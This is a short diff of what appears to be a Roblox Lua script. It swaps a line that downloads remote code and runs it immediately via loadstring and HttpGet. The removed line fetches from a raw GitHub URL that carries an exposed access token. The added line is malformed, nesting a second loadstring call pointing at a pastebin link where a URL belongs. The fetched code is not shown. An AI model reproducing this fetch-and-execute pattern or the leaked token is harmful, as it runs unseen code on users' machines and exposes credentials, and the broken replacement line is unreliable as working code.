@@ -1,4 +1,4 @@
-loadstring(game:HttpGet(('https://raw.githubusercontent.com/Darkestlegends/project-devillabs-2/main/execution%20logs?token=GHSAT0AAAAAAB7H3T7TE66A5IWYSTPBSVOWZAMHVBQ'),true))()
+loadstring(game:HttpGet(('loadstring(game:HttpGet("https://pastebin.com/raw/3nSgpwBC"))()'),true))()
 
 local UserInputService = game:GetService("UserInputService")
 local TweenService = game:GetService("TweenService")
